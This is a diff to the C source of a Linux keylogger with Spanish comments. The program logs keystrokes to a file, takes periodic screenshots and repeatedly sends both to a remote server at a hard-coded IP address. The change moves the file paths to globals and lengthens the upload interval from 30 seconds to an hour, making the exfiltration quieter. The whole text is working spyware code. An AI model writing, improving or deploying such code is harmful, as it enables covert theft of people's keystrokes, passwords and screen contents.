@@ -24,6 +24,10 @@
 // gcc main.c -o main -lX11
 // gcc main.c -o main `pkg-config --cflags --libs cairo x11`
 
+// Rutas
+char *file_path = "keylog.txt";
+char *folder_path = "images";
+
 // FUNCION PARA OBTENER EL DEVICE DEL TECLADO
 char *getDevice()
 {
@@ -292,7 +296,7 @@ void *keylogger()
     }
 
     // ABRIR EL LOG TXT (SI NO EXISTE SE CREA)
-    logfile = fopen("keylog.txt", "a");
+    logfile = fopen(file_path, "a");
 
     // SI NO SE PUEDE ABRIR TERMINA LA FUNCION
     if (!logfile)
@@ -363,8 +367,9 @@ void *takeScreenshot()
         time(&now);
         local_time = localtime(&now);
 
-        mkdir("./images", 0777); // Crea la carpeta si no existe
-        snprintf(output_file, sizeof(output_file), "./images/image_%04d-%02d-%02d_%02d-%02d-%02d.png",
+        mkdir(folder_path, 0777); // Crea la carpeta si no existe
+        snprintf(output_file, sizeof(output_file), "%s/image_%04d-%02d-%02d_%02d-%02d-%02d.png",
+                 folder_path,
                  local_time->tm_year + 1900,
                  local_time->tm_mon + 1,
                  local_time->tm_mday,
@@ -402,10 +407,6 @@ void *sendToServer()
 {
     while (true)
     {
-        // Ruta al archivo que deseas enviar
-        char *file_path = "keylog.txt";
-        char *folder_path = "images";
-
         // Dirección del servidor y ruta destino
         char *server_user = "user";
         char *server_ip = "192.168.100.41";
@@ -447,7 +448,7 @@ void *sendToServer()
             printf("Error al enviar la carpeta.\n");
         }
 
-        sleep(30);
+        sleep(3600);
     }
 }
 
